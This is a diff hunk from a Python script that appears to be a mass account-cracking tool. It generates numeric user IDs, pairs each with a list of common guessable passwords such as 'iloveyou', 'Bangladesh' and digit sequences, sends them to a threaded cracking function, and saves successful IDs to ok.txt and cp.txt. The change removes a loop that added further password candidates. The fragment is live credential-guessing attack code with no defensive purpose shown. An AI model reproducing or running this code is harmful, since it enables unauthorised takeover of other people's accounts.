@@ -1391,9 +1391,6 @@ def bd():
 		for guru in user:
 			uid = kode+guru
 			pwx = [guru[3:],kode+guru,guru[1:],'Bangladesh','bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','iloveallah','i love allah','456789','102030','203040','304050','405060','135790','0987654321','20042004','19971997','321321']
-            for Eman in HamiiID:
-                pwx.append(Eman)
-                pwx.append(guru)
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
